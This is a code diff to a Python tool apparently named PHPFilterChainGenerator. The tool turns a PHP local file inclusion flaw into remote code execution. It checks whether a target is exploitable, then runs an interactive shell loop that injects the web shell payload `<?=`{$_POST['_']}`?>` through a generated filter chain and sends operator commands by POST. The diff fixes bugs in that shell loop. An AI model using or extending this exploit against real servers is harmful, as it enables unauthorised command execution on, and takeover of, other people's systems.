@@ -160,7 +160,7 @@ class PHPFilterChainGenerator:
                 match = file_regex.search(response.text)
                 if match:
                     if not self.silent:
-                        console.print(f'\n[bold red]Possible LFI2RCE (php_filter_chain: method)[/bold red]', style='bold red')
+                        console.print('\n[bold red]Possible LFI2RCE (php_filter_chain: method)[/bold red]', style='bold red')
                     self.success_depth = i
                     self.base64_content = match.group(0)
                     return True, param_name
@@ -173,7 +173,8 @@ class PHPFilterChainGenerator:
             self.console.print("[bold red]No valid parameter name provided.[/bold red]")
             return
         
-        if not self.filter_check():
+        result, _ = self.filter_check()
+        if not result:
             self.console.print("[bold red]LFI2RCE not detected or not exploitable.[/bold red]")
             return
 
@@ -184,8 +185,7 @@ class PHPFilterChainGenerator:
         while True:
             try:
                 cmd = session.prompt(HTML('<ansired><b># </b></ansired>'))
-                cmd = f"echo [S]; {cmd};echo [E]"
-            
+
                 if "exit" in cmd:
                     raise KeyboardInterrupt
                 elif not cmd:
@@ -193,10 +193,11 @@ class PHPFilterChainGenerator:
                 elif "clear" in cmd:
                     if os.name == 'posix':
                         os.system('clear')
-                elif os.name == 'nt':
-                    os.system('cls')                                                             
-                if cmd.lower() in ["exit", "quit"]:
-                    break
+                    elif os.name == 'nt':
+                        os.system('cls')
+                    continue
+
+                cmd = f"echo [S]; {cmd};echo [E]"
 
                 shell_code = self.generate_filter_chain("<?=`{$_POST['_']}`?>")
                 parsed_url = urllib.parse.urlparse(self.url)
@@ -210,8 +211,9 @@ class PHPFilterChainGenerator:
                     response = requests.post(fuzzed_url, data={"_": cmd}, verify=False)    
                 except requests.exceptions.ConnectionError:
                     self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
-                        
-                pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL) 
+                    continue
+
+                pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL)
                 response_content = pattern.search(response.text)
                 if response_content:
                     shell_output = response_content.group(1)
